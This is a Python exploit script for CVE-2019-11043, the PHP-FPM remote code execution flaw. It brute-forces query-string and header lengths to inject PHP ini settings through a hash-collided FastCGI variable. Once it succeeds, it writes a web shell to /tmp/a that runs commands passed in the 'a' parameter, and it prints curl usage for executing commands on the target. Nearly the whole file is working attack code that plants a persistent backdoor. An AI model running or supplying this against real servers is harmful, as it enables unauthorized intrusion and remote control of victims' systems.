import requests, argparse, sys, time
from requests_toolbelt.utils import dump
import urllib.parse

""" Parse Arguments given to this script """
parser = argparse.ArgumentParser(description='Process Parameters.')
parser.add_argument(
                    '--target',
                    type=str,
                    help='The target which should be tested if vulnerable or not, e.g. (http://localhost:11043/index.php)',
                    required=True
                )
args = parser.parse_args()


""" Setup """
target = args.target

hash_strndup="Ebut" 
header_value = "tudda nwsec" # qazxs edcvf

http_header = {
    "User-Agent":"CVE-2019-11043",
    "TUD":"A", 
    "Ebut":"tudda nwsec" # hash_strndup hash collision with PHP_VALUE when appended to HTTP_*
}

php_settings = [
	"short_open_tag=1;;;;;;;", # Open short php tab 
	"html_errors=0;;;;;;;;;;", # Turn off HTML tag in the eror message
	"include_path=/tmp;;;;;;", # Include Path
	"auto_prepend_file=a;;;;", # Specifies the files that are automatically included before the script executes, similar to require().
	"log_errors=1;;;;;;;;;;;", # Enable error logging
	"error_reporting=2;;;;;;", # Sepcify error level
	"error_log=/tmp/a;;;;;;;", # Error logging file
	"extension_dir=%22%3C%3F=%60%22;;;", # Specify the load directory for the extension
	"extension=%22$_GET%5Ba%5D%60%3F%3E%22", # Specify the extension to load
]

postfix = "TUD"

remote_command = "a=/bin/sh+-c+'which+which'" # The command that should be executed remotely
remote_test = "bin/which" # Check if RCE is working

query_string_length = [] # Query String Length
header_value_length = 1 # Header Value Length

"""  """
def repeat_to_length(input, desiredLength):
    return (input * (desiredLength//len(input) + 1))[:desiredLength]

def get_QSL_candidates():
    """
    This function sends range of requests to the target in order to find candidates that result in errors providing a error coe 502. They are expanded to a length between 

    The fixed length 34 bytes of the string "PHP%0ABonusChallengeExploits.php" allows that we can exactly place the null-byte in the right address.

    :param p1: 
    :param p2: 
    :param p3: 
    :return: 
    """
    print("‚ùîRequesting target to find qsl candidates.")
    for x in range(1500,1950):
        res = requests.get(target+ "/PHP%0ABonusChallengeExploits.php?"+(repeat_to_length(postfix, x-2) ), headers=http_header)
        if res.status_code == 502:
            print("\t[Response] Status sode is {} for QSL {}. Meets criteria and added as candidate".format(res.status_code, x))
            query_string_length.append(x)
    if len(query_string_length) == 0:
        print("‚ùå There has been no candidate found. Server not vulnerable or query string length did not meet requirements.")
        sys.exit()
    # Post process qsl candidates to get all candidates
    qsl_candidate_extend = []
    for qsl in query_string_length:
        qsl_extend = [qsl-10,qsl-5,qsl]
        qsl_candidate_extend.extend(qsl_extend)
    qsl_list = list(set(qsl_candidate_extend))
    qsl_list.sort()
    print("\tPost processed QSL candidate(s): {}".format(", ".join(str(x) for x in qsl_list)))
    return qsl_list



def test_QSL_candidates(candidates, header_value_length):
    """
    This function checks the found candidates if we can set the session.auto_start to 1 by finding a length of the header to overwrite the HTTP_EBUT to PHP_VALUE.

    Keyword arguments:
    :param candidates -- The found candidates to check whether the target is vulnerable or not  (default: []):
    :param header_value_length -- The header value length to start checking (default: 1):
    """

    print("‚öôÔ∏è Testing found candidates")
    r = True
    # Set session.auto_start=1 and find a length of the header to have a buffer overflow
    # %0A for newline \n <LF>
    for candidate in candidates:
        print("\t[Test] QSL Candidate: ", candidate)
        while r:
            # Adjust the length of 'TUD' Header to exactly overwrite the HTTP_EBUT and set its value to PHP_VALUE%0Asession.auto_start=1;;;
            res = requests.get(
                target+"/PHP_VALUE%0Asession.auto_start=1;;;?"+(repeat_to_length(postfix, candidate-2)),
                headers={
                    "User-Agent":"CVE-2019-11043",
                    "TUD":("A"*header_value_length),
                    hash_strndup:header_value
                }
            )
            # data = dump.dump_all(res)
            # print(data.decode('utf-8'))
            # time.sleep(5)
            # If 'Set-Cookie' in HTTP response header is set, we know that the target is vulnerable and our exploit succeeds
            if "Set-Cookie" in res.headers and "PHPSESSID" in res.headers["Set-Cookie"]:
                print("üí£ Target seems vulnerable with attack parameters: (QSL:{}/HVL:{}): {}".format(
                    str(candidate),
                    str(header_value_length),
                    res.headers["Set-Cookie"]
                ))
                session_hvl = header_value_length
                session_qsl = candidate
                r = False
                break
            
            header_value_length = (header_value_length+1)

            if header_value_length > 556:
                header_value_length = 1
                break
        if r is False:
            break

    try:
        session_hvl
        return True, session_hvl
    except:
        print("Target not vulnerable or something goes wrong...")
        return False, 0


def deactivate_sessionAutoStart():
    """
        This method tries to set the session.auto_start to 0 for all found candidates
    """

    # Trying to set session.auto_start=0
    for candidate in qsl_candidates:
        res = requests.get(target+"/PHP_VALUE%0Asession.auto_start=0;;;?"+(repeat_to_length(postfix, candidate-2)), headers={"User-Agent":"CVE-2019-11043","TUD":("A"*session_hvl), hash_strndup:header_value})



########
######## Sarting to Exploit the Vulnerability
########

print("üöÄüöÄüöÄ Starting...")
qsl_candidates = get_QSL_candidates()
isVulnerable, session_hvl = test_QSL_candidates(qsl_candidates, header_value_length)

if isVulnerable:
    deactivate_sessionAutoStart() # Trying to set session.auto_start=0

    for zz in range(qsl_candidates[0],(qsl_candidates[-1])):
        # Utilizing the RCE chain by using php.ini settings
        for setting in php_settings:
            intremove = (len(setting)+4)
            res = requests.get(target+"/PHP_VALUE%0A"+setting+"?"+remote_command+"&"+(repeat_to_length(postfix, zz-intremove-2)), headers={"User-Agent":"CVE-2019-11043","TUD":("A"*session_hvl), hash_strndup:header_value})
            time.sleep(0.5)

            if remote_test in res.text:
                print("\tTrying to cleanup /tmp/a...")
                cleanupCommand = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"
                cleanup = target + "?a=" + urllib.parse.quote(cleanupCommand)
                while True:
                    res = requests.get(cleanup)
                    if res.status_code == 200:
                        print("\tGood. Cleanup Done. Have Fun.")
                        break

                print(
                    "‚úÖ Success: Remote Code Execution exploit successfully deployed!\n\n"+\
                    "You should be able to run commands using:\n"+\
                    "\tüåç curl "+target+"?a=bin/ls+/\n"+\
                    "\tor\n"+\
                    "\tüåç curl "+target+"?a=%0asleep+5%0a+/\n"
                )
                sys.exit()

    for i in range(0,2):
        res = requests.get(target+"?a=usr/bin/which+which")
        if remote_test in res.text:
            print(
                "‚úÖ Success: Remote Code Execution successfully exploited!\n\n"+\
                "You should be able to run commands using:\n"+\
                "\tcurl "+target+"?a=bin/ls+/\n"+\
                "\tor\n"+\
                "\tcurl "+target+"?a=%0asleep+5%0a+/\n"
            )
            sys.exit()
